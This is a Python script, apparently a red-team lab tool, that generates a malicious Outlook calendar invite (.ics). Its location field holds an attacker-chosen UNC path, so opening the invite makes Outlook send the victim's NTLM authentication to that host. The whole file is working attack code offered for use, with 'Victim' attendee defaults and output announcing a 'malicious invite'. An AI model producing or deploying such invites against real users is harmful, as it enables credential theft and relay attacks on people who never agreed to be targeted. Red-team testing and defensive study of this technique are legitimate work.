from __future__ import annotations

import argparse
from datetime import datetime, timedelta
from pathlib import Path
from uuid import uuid4

import pytz


def build_ics(target: str, organiser: str, attendee: str) -> str:
    now = datetime.now(pytz.utc)
    start = now + timedelta(minutes=5)
    end = start + timedelta(minutes=30)
    uid = uuid4()
    return (
        "BEGIN:VCALENDAR\n"
        "VERSION:2.0\n"
        "PRODID:-//RedTeam//NTLM Leak Simulator//EN\n"
        "METHOD:REQUEST\n"
        "BEGIN:VEVENT\n"
        f"UID:{uid}@ntlm-lab\n"
        f"DTSTAMP:{now.strftime('%Y%m%dT%H%M%SZ')}\n"
        f"DTSTART:{start.strftime('%Y%m%dT%H%M%SZ')}\n"
        f"DTEND:{end.strftime('%Y%m%dT%H%M%SZ')}\n"
        f"ORGANIZER;CN=Lab Operator:mailto:{organiser}\n"
        f"ATTENDEE;CN=Victim:mailto:{attendee}\n"
        f"SUMMARY:Outlook NTLM Leak Demonstration\n"
        f"LOCATION:{target}\n"
        "DESCRIPTION:Open this invite with Outlook to trigger an SMB authentication leak.\n"
        "END:VEVENT\n"
        "END:VCALENDAR\n"
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Generate malicious Outlook meeting invite")
    parser.add_argument("--output", required=True, type=Path, help="Destination .ics path")
    parser.add_argument(
        "--target",
        required=True,
        help="UNC path that will capture NTLM authentication (e.g. \\host\\share)",
    )
    parser.add_argument(
        "--organiser",
        default="operator@lab.local",
        help="Email address for the organizer (default: operator@lab.local)",
    )
    parser.add_argument(
        "--attendee",
        default="victim@lab.local",
        help="Email address for the attendee (default: victim@lab.local)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    ics_content = build_ics(args.target, args.organiser, args.attendee)
    args.output.write_text(ics_content, encoding="utf8")
    print(f"[+] Malicious invite written to {args.output}")


if __name__ == "__main__":
    main()
